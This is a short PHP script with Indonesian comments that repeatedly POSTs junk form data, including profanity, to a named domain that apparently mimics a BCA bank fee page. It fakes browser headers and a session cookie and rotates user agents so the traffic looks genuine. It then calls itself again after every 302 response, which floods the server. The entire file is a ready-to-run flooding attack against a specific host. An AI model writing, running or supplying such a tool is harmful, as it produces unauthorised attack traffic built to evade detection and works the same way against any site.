<?php

function getRandomUserAgent() {
    $userAgents = array(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
        // Daftar user-agent lainnya
    );

    // Pilih user-agent secara acak dari daftar
    return $userAgents[array_rand($userAgents)];
}


function iteration($function){
    if( $function == 302){
        echo "\e[1;32mSucess\e[0m ✅ \n";
        iteration(CallBackAttack());
    }else {
        echo "\e[1;31mAbort\e[0m ❌ \n";
    }
}


function CallBackAttack()
{
        // URL tujuan
    $url = 'https://skema-layanantarif.xyz/Bca-Tarif-transaksi/dataindex.php';
    // Data yang akan dikirim dalam permintaan POST
    $postData = 'input=input&tarif=kentodKwpotod&a=pentod&b=sukentod';
    // Daftar header yang diberikan
    $headers = array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding: gzip, deflate, br, zstd',
        'Accept-Language: id-ID,id;q=0.9',
        'Cache-Control: no-cache',
        'Content-Type: application/x-www-form-urlencoded',
        'Content-Length: ' . strlen($postData),
        'Cookie: PHPSESSID=58rigfid21ce4skfuclaupkkkc',
        'Dnt: 1',
        'Origin: https://skema-layanantarif.xyz',
        'Pragma: no-cache',
        'Referer: https://skema-layanantarif.xyz/Bca-tarif-transaksi/',
        'Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: "Windows"',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: ' . getRandomUserAgent()
    );

    // Function untuk mendapatkan user-agent secara acak

    // Inisialisasi curl
    $ch = curl_init();

    // Set URL yang akan dikunjungi
    curl_setopt($ch, CURLOPT_URL, $url);

    // Aktifkan metode POST
    curl_setopt($ch, CURLOPT_POST, 1);

    // Masukkan data yang akan dikirim
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

    // Set header
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    // Agar curl mengembalikan respons sebagai string
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Eksekusi curl dan simpan respons
    $response = curl_exec($ch);

    // Dapatkan informasi tentang status HTTP
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Tutup curl
    curl_close($ch);

    // Tampilkan status respons dan responsnya
    return $http_status;
}

iteration(CallBackAttack())

?>
